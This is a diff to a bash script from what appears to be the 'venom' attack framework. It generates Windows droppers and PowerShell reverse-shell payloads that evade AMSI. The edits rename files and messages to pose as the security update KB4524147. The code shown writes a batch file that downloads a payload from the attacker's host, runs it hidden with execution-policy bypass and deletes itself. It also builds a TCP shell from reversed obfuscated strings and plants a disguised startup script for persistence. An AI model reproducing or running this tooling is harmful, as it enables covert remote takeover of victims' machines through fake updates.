@@ -12010,15 +12010,16 @@ sleep 2
 
 lhost=$(zenity --title="☠ Enter LHOST ☠" --text "example: $IP" --entry --width 300) > /dev/null 2>&1
 lport=$(zenity --title="☠ Enter LPORT ☠" --text "example: 666" --entry --width 300) > /dev/null 2>&1
-Drop=$(zenity --title="☠ Enter DROPPER NAME ☠" --text "example: Update-ID00788\nWarning: Allways Start FileNames With [Capital Letters]" --entry --width 300) > /dev/null 2>&1
-NaM=$(zenity --title="☠ Enter PAYLOAD NAME ☠" --text "example: Security-update\nWarning: Allways Start FileNames With [Capital Letters]" --entry --width 300) > /dev/null 2>&1
+Drop=$(zenity --title="☠ Enter DROPPER NAME ☠" --text "example: Update-KB4524147\nWarning: Allways Start FileNames With [Capital Letters]" --entry --width 300) > /dev/null 2>&1
+NaM=$(zenity --title="☠ Enter PAYLOAD NAME ☠" --text "example: Security-Update\nWarning: Allways Start FileNames With [Capital Letters]" --entry --width 300) > /dev/null 2>&1
 
 
 ## setting default values in case user have skip this ..
 if [ -z "$lhost" ]; then lhost="$IP";fi
 if [ -z "$lport" ]; then lport="443";fi
-if [ -z "$Drop" ]; then Drop="Update-ID00788";fi
-if [ -z "$NaM" ]; then NaM="Security-update";fi
+if [ -z "$NaM" ]; then NaM="Security-Update";fi
+if [ -z "$Drop" ]; then Drop="Update-KB4524147";fi
+
 
 # display final settings to user
 echo "${BlueF}[${YellowF}i${BlueF}]${white} AMSI MODULE SETTINGS"${Reset};
@@ -12058,7 +12059,7 @@ echo "Framework: venom v1.0.16 (amsi evasion)" >> $IPATH/output/$NaM.ps1
 echo "Original shell: @ZHacker13" >> $IPATH/output/$NaM.ps1
 echo "#>" >> $IPATH/output/$NaM.ps1
 echo "" >> $IPATH/output/$NaM.ps1
-echo "write-Host \"Please Wait, Installing KB4524147 Security Updates ..\" -ForeGroundColor green -BackGroundColor black;" >> $IPATH/output/$NaM.ps1
+echo "write-Host \"Searching KB4524147 Index For Available Updates .. ..\" -ForeGroundColor green -BackGroundColor black;" >> $IPATH/output/$NaM.ps1
 echo "\$MethodInvocation = \"gnidocnEiicsA.txeT.metsyS\";\$Constructor = \$MethodInvocation.ToCharArray();[Array]::Reverse(\$Constructor);" >> $IPATH/output/$NaM.ps1
 echo "\$NewObjectCommand = (\$Constructor -Join '');\$icmpv6 = \"StreamWriter\";\$assembly = \"tneilCpcT.stekcoS.teN\";" >> $IPATH/output/$NaM.ps1
 echo "\$CmdCharArray = \$assembly.ToCharArray();[Array]::Reverse(\$CmdCharArray);\$PSArgException = (\$CmdCharArray -Join '');" >> $IPATH/output/$NaM.ps1
@@ -12166,8 +12167,8 @@ sleep 2
 
 lhost=$(zenity --title="☠ Enter LHOST ☠" --text "example: $IP" --entry --width 300) > /dev/null 2>&1
 lport=$(zenity --title="☠ Enter LPORT ☠" --text "example: 666" --entry --width 300) > /dev/null 2>&1
-Drop=$(zenity --title="☠ Enter DROPPER NAME ☠" --text "example: Update-ID00788\nWarning: Allways Start FileNames With [Capital Letters]" --entry --width 300) > /dev/null 2>&1
-NaM=$(zenity --title="☠ Enter PAYLOAD NAME ☠" --text "example: Security-update\nWarning: Allways Start FileNames With [Capital Letters]" --entry --width 300) > /dev/null 2>&1
+Drop=$(zenity --title="☠ Enter DROPPER NAME ☠" --text "example: Update-KB4524147\nWarning: Allways Start FileNames With [Capital Letters]" --entry --width 300) > /dev/null 2>&1
+NaM=$(zenity --title="☠ Enter PAYLOAD NAME ☠" --text "example: Security-Update\nWarning: Allways Start FileNames With [Capital Letters]" --entry --width 300) > /dev/null 2>&1
 CN=$(zenity --title="☠ Enter OpenSSL CN (domain name) ☠" --text "example: SSARedTeam.com" --entry --width 300) > /dev/null 2>&1
 rpath=$(zenity --title="☠ Enter Payload Upload Path (target dir) ☠" --text "example: %tmp%\nexample: %userprofile%\\\\\\\Desktop" --entry --width 350) > /dev/null 2>&1
 
@@ -12175,10 +12176,10 @@ rpath=$(zenity --title="☠ Enter Payload Upload Path (target dir) ☠" --text "
 ## setting default values in case user have skip this ..
 if [ -z "$lhost" ]; then lhost="$IP";fi
 if [ -z "$lport" ]; then lport="443";fi
-if [ -z "$NaM" ]; then NaM="Security-update";fi
 if [ -z "$rpath" ]; then rpath="%tmp%";fi
-if [ -z "$Drop" ]; then Drop="Update-ID00788";fi
 if [ -z "$CN" ]; then CN="SSARedTeam.com";fi
+if [ -z "$NaM" ]; then NaM="Security-Update";fi
+if [ -z "$Drop" ]; then Drop="Update-KB4524147";fi
 
 
 # display final settings to user
@@ -12201,9 +12202,8 @@ echo "---"
 # echo "${BlueF}[☠]${white} Building Obfuscated ps1 dropper ..${white}";sleep 2
 echo "${BlueF}[☠]${white} Building Obfuscated batch dropper ..${white}";sleep 2
 echo "@echo off" > $IPATH/output/$Drop.bat
-echo "title Cumulative Security Update ID00788" >> $IPATH/output/$Drop.bat
+echo "title Cumulative Security Update KB4524147" >> $IPATH/output/$Drop.bat
 echo "echo Please Wait, Installing $NaM .." >> $IPATH/output/$Drop.bat
-echo "powershell Get-HotFix" >> $IPATH/output/$Drop.bat
 echo "PoWeRsHeLl.exe -C (nEw-ObJeCt NeT.WebClIeNt).DoWnLoAdFiLe('http://$lhost/$NaM.ps1', '$rpath\\$NaM.ps1')" >> $IPATH/output/$Drop.bat
 echo "PoWeRsHeLl.exe -Execution Bypass -WindowStyle Hidden -NoProfile -File \"$rpath\\$NaM.ps1\"" >> $IPATH/output/$Drop.bat
 echo "Timeout /T 2 >nul && Del /F /Q $Drop.bat" >> $IPATH/output/$Drop.bat # <-- delete script at the end of execution.
@@ -12217,7 +12217,7 @@ echo "Framework: venom v1.0.16 (amsi evasion)" >> $IPATH/output/$NaM.ps1
 echo "Original shell: @int0x33" >> $IPATH/output/$NaM.ps1
 echo "#>" >> $IPATH/output/$NaM.ps1
 echo "" >> $IPATH/output/$NaM.ps1
-echo "write-Host \"Please Wait, Executing PS Application ..\" -ForeGroundColor green -BackGroundColor black;" >> $IPATH/output/$NaM.ps1
+echo "write-Host \"Searching KB4524147 Index For Available Updates ..\" -ForeGroundColor green -BackGroundColor black;" >> $IPATH/output/$NaM.ps1
 echo "\$MethodInvocation = \"tneilCpcT.stekcoS.teN\";\$Constructor = \$MethodInvocation.ToCharArray();[Array]::Reverse(\$Constructor);" >> $IPATH/output/$NaM.ps1
 echo "\$NewObjectCommand = (\$Constructor -Join '');\$assembly = \"gnidocnEiicsA.txeT.metsyS\";\$CmdCharArray = \$assembly.ToCharArray();" >> $IPATH/output/$NaM.ps1
 echo "[Array]::Reverse(\$CmdCharArray);\$PSArgException = (\$CmdCharArray -Join '');" >> $IPATH/output/$NaM.ps1
@@ -12332,7 +12332,7 @@ sleep 2
 ## Store User Inputs (bash variable declarations)..
 lhost=$(zenity --title="☠ Enter LHOST ☠" --text "example: $IP" --entry --width 300) > /dev/null 2>&1
 lport=$(zenity --title="☠ Enter LPORT ☠" --text "example: 666" --entry --width 300) > /dev/null 2>&1
-Drop=$(zenity --title="☠ Enter DROPPER NAME ☠" --text "example: Update-ID00788\nWarning: Allways Start FileNames With [Capital Letters]" --entry --width 300) > /dev/null 2>&1
+Drop=$(zenity --title="☠ Enter DROPPER NAME ☠" --text "example: Update-KB4524147\nWarning: Allways Start FileNames With [Capital Letters]" --entry --width 300) > /dev/null 2>&1
 NaM=$(zenity --title="☠ Enter PAYLOAD NAME ☠" --text "example: Security-Update\nWarning: Allways Start FileNames With [Capital Letters]" --entry --width 300) > /dev/null 2>&1
 rpath=$(zenity --title="☠ Enter Payload Upload Path (target dir) ☠" --text "example: %tmp%\nexample: %ProgramFiles%\nexample: %LocalAppData% (*)\nexample: %userprofile%\\\\\\\Desktop\n\n(*) Recomended Path For Persistence Module." --entry --width 350) > /dev/null 2>&1
 
@@ -12340,9 +12340,9 @@ rpath=$(zenity --title="☠ Enter Payload Upload Path (target dir) ☠" --text "
 ## Setting default values in case user have skip this ..
 if [ -z "$lhost" ]; then lhost="$IP";fi
 if [ -z "$lport" ]; then lport="443";fi
-if [ -z "$Drop" ]; then Drop="Update-ID00788";fi
-if [ -z "$rpath" ]; then rpath="%LocalAppData%";fi
 if [ -z "$NaM" ]; then NaM="Security-Update";fi
+if [ -z "$Drop" ]; then Drop="Update-KB4524147";fi
+if [ -z "$rpath" ]; then rpath="%LocalAppData%";fi
 
 
 ## Generate Random {4 chars} Persistence script name. { KB4524147_4Fn7.update }
@@ -12401,7 +12401,7 @@ else
    ## Persistence script updated to hidde the 'powershell execution command' (better persistence social engineering).
    echo "echo @echo off > \"%appdata%\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\KB4524147_$random_name.update.bat\"" >> $IPATH/output/$Drop.$ext.bat
    echo "echo title Cumulative Security Update KB4524147 >> \"%appdata%\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\KB4524147_$random_name.update.bat\"" >> $IPATH/output/$Drop.$ext.bat
-   echo "echo echo Searching KB4524147 Indexs For Security Updates .. >> \"%appdata%\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\KB4524147_$random_name.update.bat\"" >> $IPATH/output/$Drop.$ext.bat
+   echo "echo echo Searching KB4524147 Index For Available Updates .. >> \"%appdata%\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\KB4524147_$random_name.update.bat\"" >> $IPATH/output/$Drop.$ext.bat
    echo "echo PoWeRsHeLl.exe -Execution Bypass -WindowStyle Hidden -NoProfile -File \"$rpath\\$NaM.ps1\" >> \"%appdata%\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\KB4524147_$random_name.update.bat\"" >> $IPATH/output/$Drop.$ext.bat
    echo "Timeout /T 2 >nul && Del /F /Q $Drop.$ext.bat" >> $IPATH/output/$Drop.$ext.bat # <-- delete script at the end of execution.
 fi
